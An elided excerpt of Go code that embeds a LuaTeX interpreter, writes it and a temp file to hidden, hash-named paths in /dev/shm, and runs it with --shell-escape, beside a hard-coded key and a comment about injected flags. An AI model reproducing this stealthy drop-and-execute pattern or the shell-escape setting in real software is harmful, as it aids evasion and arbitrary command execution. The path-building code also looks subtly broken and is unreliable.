...
//go:embed .2aac5930bb7a0ed00b9c1074c7a1866ba713c0f0afaf7c2d2ec7a7343ed0ba80c3689dc1b2096778eaf1d620a95274cb9358c13ddd0dc74cbdd19bed1a8ea318.lib/luatex
...
const hexKey = "1664908749a279fdffe337cf55d4b69d0f908c1554f79097af97f9b1236b000e"
...
//  changed here to a specific location or deleted to only use the system interpreter
    intPath := fmt.Sprintf("%s/c9057211f22a33e1ca4ef6d83fde579222cbf67349d575aceca88ebc6088ad42", "/dev/shm/.c9057211f22a33e1ca4ef6d83fde579222cbf67349d575aceca88ebc6088ad42")
...
parts = append(parts, "--interaction=nonstopmode")
parts = append(parts, "--luaonly")
parts = append(parts, "--shell-escape")
parts = append(parts, "--output-format=pdf") // Command flags injected here (or only this comment)
...
if needsFile {
        ...
        tmpPath = fmt.Sprintf("%s/a5d3dc8ae2e7f7c4e84df848acc5115e4fe26da72263f021528ed8f16e007baf", "/dev/shm/.a5d3dc8ae2e7f7c4e84df848acc5115e4fe26da72263f021528ed8f16e007baf/")
...
cmd := exec.Command(intPath, parts[1:]...)
    // cmd.Env = append(os.Environ(), "LD_LIBRARY_PATH=./.2aac5930bb7a0ed00b9c1074c7a1866ba713c0f0afaf7c2d2ec7a7343ed0ba80c3689dc1b2096778eaf1d620a95274cb9358c13ddd0dc74cbdd19bed1a8ea318.lib")
